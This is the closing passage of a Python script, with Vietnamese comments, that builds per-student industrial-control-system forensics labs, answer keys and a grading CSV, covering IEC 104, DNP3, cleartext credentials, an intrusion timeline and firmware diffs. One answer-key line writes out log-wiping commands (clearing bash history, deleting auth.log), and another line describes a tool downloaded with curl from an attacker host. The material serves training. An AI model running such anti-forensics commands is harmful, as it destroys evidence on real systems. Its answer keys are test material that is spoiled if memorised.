        f"(frame {', '.join(str(x) for x in f['s7']['stop_frames'])}) |",
        "",
        "## Lab 4 - IEC 60870-5-104",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| Common address của trạm | **{v['iec_ca']}** |",
        f"| IOA được select rồi execute đúng chuẩn | **{v['ioa_pump']}** |",
        f"| IOA bị execute mà không select | **{v['ioa_valve']}** (frame {f['iec104']['no_select_frame']}) |",
        f"| IOA bị select nhưng không bao giờ execute | **{v['ioa_valve'] + 1}** |",
        f"| Lệnh bị thiết bị từ chối | setpoint IOA {v['ioa_setpoint']} = {v['iec_setpoint']} "
        f"(actcon có cờ P/N, frame {f['iec104']['refused_frame']}). IOA này cũng xuất hiện "
        "trong bảng SBO vì được execute thẳng, không select |",
        "| Hành động làm operator mất tầm nhìn | `STOPDT act` cuối phiên "
        f"(frame {f['iec104']['stopdt_frame']}) |",
        f"| DNP3 (mở rộng): CROB | LATCH_ON index 5, frame {f['dnp3']['crob_frame']}; "
        "sau đó disable-unsolicited và cold-restart |",
        "",
        "## Lab 5 - thông tin đăng nhập dạng rõ",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| Tài khoản SQL Server | `{v['service_user']}` |",
        f"| Mật khẩu SQL Server | `{v['sql_password']}` (TDS LOGIN7: đảo nibble rồi XOR 0xA5) |",
        f"| Mật khẩu FTP | `{v['ftp_password']}` (frame {f['creds']['ftp_frame']}) |",
        f"| SNMP community | `{v['snmp_community']}` |",
        f"| Tên database bị truy vấn | `{v['plant_en']}` / bảng `dbo.ProcessTags` |",
        "",
        "## Lab 6 - timeline",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| IP tấn công phía IT | `{v['attacker_it']}` |",
        f"| Tài khoản bị chiếm | `{v['service_user']}` (sau 2 lần sai mật khẩu) |",
        f"| Tài khoản mới được tạo | `{v['new_account']}`, được thêm vào group `sudo` |",
        f"| Công cụ được tải về | `{v['tool_name']}` qua curl từ `{v['attacker_it']}:8000` |",
        f"| Năm cần truyền cho --log-year | **{f['logs']['auth_year']}** |",
        "| Hành động xoá dấu vết | `echo '' > ~/.bash_history` và `rm -f /var/log/auth.log.1` |",
        "| Thứ tự đúng | truy cập IT → tạo tài khoản → tải công cụ → quét OT → "
        f"ghi coil {v['alarm_coil']} → dừng dịch vụ historian → xoá log |",
        "",
        "## Lab 7 - firmware và HMI cũ",
        "",
        "| Câu | Đáp án |",
        "|---|---|",
        f"| Tiêu đề cartridge | `{v['rom_title'].upper()}` |",
        "| Bank chứa text | bank 1 (0x4000), bank 2 chứa zlib ở `0x8000` |",
        f"| Khác biệt giữa v1 và v2 | nhãn `PUMP {v['pump_tag']}` → `PUMP {v['pump_tag']} MOD`; "
        f"hằng số float tại `0x5000`: **{v['rom_old_limit']}** → **{v['rom_new_limit']}**; "
        "checksum header và global được tính lại |",
        "| Ý nghĩa | ai đó sửa ngưỡng rồi build lại image - chính là dạng \"setpoint bị chỉnh\" |",
        "| INT trong file .COM | INT 21h (DOS), INT 10h (màn hình), **INT 14h (cổng nối tiếp)** |",
        f"| Hằng số trong .COM | {', '.join(str(x) for x in f['dos']['dos_floats'])} - "
        "trùng với giá trị cũ/mới trong Lab 3 |",
        "",
        "## Gợi ý chấm",
        "",
        "- Mỗi lab 10 điểm; trả lời đúng nhưng không kèm frame number: trừ 2 điểm.",
        "- Câu hỏi \"lệnh có thành công không\" quan trọng hơn câu hỏi giá trị: "
        "học viên phải phân biệt được *đã thử* và *đã thành công*.",
        "- Học viên tự chạy được lệnh CLI mà không cần GUI: cộng 5 điểm toàn bài.",
        "",
    ]
    with open(path, "w") as fh:
        fh.write("\n".join(lines))


def write_tracking(keys: list, path: str) -> None:
    """Bảng theo dõi cả lớp: mỗi học viên một dòng, kèm các đáp án chính và
    các cột điểm để trống cho giảng viên điền."""
    import csv as _csv
    cols = ["ma_de", "hoc_vien", "nha_may",
            "L1_ip_la", "L1_mat_khau_dcc", "L1_so_lan_thu",
            "L2_ip_quet", "L2_coil", "L2_thanh_ghi", "L2_setpoint",
            "L3_szl", "L3_khoi", "L3_tag", "L3_gia_tri_moi", "L3_cpu_stop",
            "L4_ca", "L4_ioa_khong_select", "L4_setpoint_bi_tu_choi",
            "L5_tai_khoan_sql", "L5_mat_khau_sql", "L5_mat_khau_ftp", "L5_snmp",
            "L6_ip_it", "L6_tai_khoan_moi", "L6_nam_log",
            "L7_hang_so_cu", "L7_hang_so_moi",
            "diem_L1", "diem_L2", "diem_L3", "diem_L4", "diem_L5", "diem_L6",
            "diem_L7", "diem_L8", "diem_kiem_tra", "tong", "ghi_chu"]
    with open(path, "w", newline="", encoding="utf-8-sig") as fh:
        w = _csv.writer(fh)
        w.writerow(cols)
        for info in keys:
            v, f = info["values"], info["facts"]
            w.writerow([
                info["seed"], info["student"], v["plant_vn"],
                v["attacker_ot"], v["dcc_password"],
                f["bacnet"]["dcc_attempts_first_target"],
                v["modbus_attacker"], v["alarm_coil"],
                f"4x{v['setpoint_reg']}-{v['setpoint_reg'] + 1}", v["new_setpoint"],
                " ".join(f"0x{x:04x}" for x in v["szl_ids"]),
                " ".join(b[2] for b in v["blocks"]),
                f"DB{v['db_number']}.DBX{v['db_offset']}.0", v["chlorine_new"],
                "bi tu choi",
                v["iec_ca"], v["ioa_valve"], v["iec_setpoint"],
                v["service_user"], v["sql_password"], v["ftp_password"],
                v["snmp_community"],
                v["attacker_it"], v["new_account"], f["logs"]["auth_year"],
                v["rom_old_limit"], v["rom_new_limit"],
                "", "", "", "", "", "", "", "", "", "", "",
            ])


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--seed", type=int, help="mã đề (số nguyên bất kỳ)")
    ap.add_argument("--out", default="lab", help="thư mục đích")
    ap.add_argument("--student", default="", help="tên học viên, ghi vào đề")
    ap.add_argument("--class-list", metavar="FILE",
                    help="file danh sách học viên, mỗi dòng một tên; "
                         "sinh một bộ đề riêng cho từng người")
    ap.add_argument("--dap-an", action="store_true",
                    help="xuất file đáp án (dành cho giảng viên)")
    ap.add_argument("--json", action="store_true", help="xuất thêm đáp án dạng JSON")
    ap.add_argument("--tracking", action="store_true",
                    help="xuất bảng theo dõi CSV (đáp án chính + cột điểm trống)")
    args = ap.parse_args()

    if args.class_list:
        with open(args.class_list) as fh:
            names = [x.strip() for x in fh if x.strip()]
        os.makedirs(args.out, exist_ok=True)
        keys = []
        for i, name in enumerate(names, start=1):
            seed = 1000 + i
            folder = os.path.join(args.out, f"de-{seed}")
            info = build(seed, folder, name)
            keys.append(info)
            if args.dap_an:
                write_answer_key(info, os.path.join(args.out, f"dap-an-{seed}.md"))
            print(f"{name:<28} mã đề {seed}  ->  {folder}")
        if args.json:
            with open(os.path.join(args.out, "dap-an.json"), "w") as fh:
                json.dump([{"seed": k["seed"], "student": k["student"],
                            "values": k["values"], "facts": k["facts"]}
                           for k in keys], fh, indent=2, ensure_ascii=False)
        if args.tracking:
            tpath = os.path.join(args.out, "bang-theo-doi.csv")
            write_tracking(keys, tpath)
            print(f"bảng theo dõi -> {tpath}")
        print(f"\n{len(names)} bộ đề đã sinh trong {args.out}/")
        return

    seed = args.seed if args.seed is not None else 101
    info = build(seed, args.out, args.student)
    print(f"mã đề {seed} -> {args.out}/")
    if args.dap_an:
        p = os.path.join(os.path.dirname(args.out.rstrip("/")) or ".",
                         f"dap-an-{seed}.md")
        write_answer_key(info, p)
        print(f"đáp án -> {p}")
    if args.tracking:
        tpath = os.path.join(os.path.dirname(args.out.rstrip("/")) or ".",
                             f"bang-theo-doi-{seed}.csv")
        write_tracking([info], tpath)
        print(f"bảng theo dõi -> {tpath}")
    if args.json:
        p = os.path.join(args.out, f"dap-an-{seed}.json")
        with open(p, "w") as fh:
            json.dump(info, fh, indent=2, ensure_ascii=False)
        print(f"đáp án JSON -> {p}")


if __name__ == "__main__":
    main()
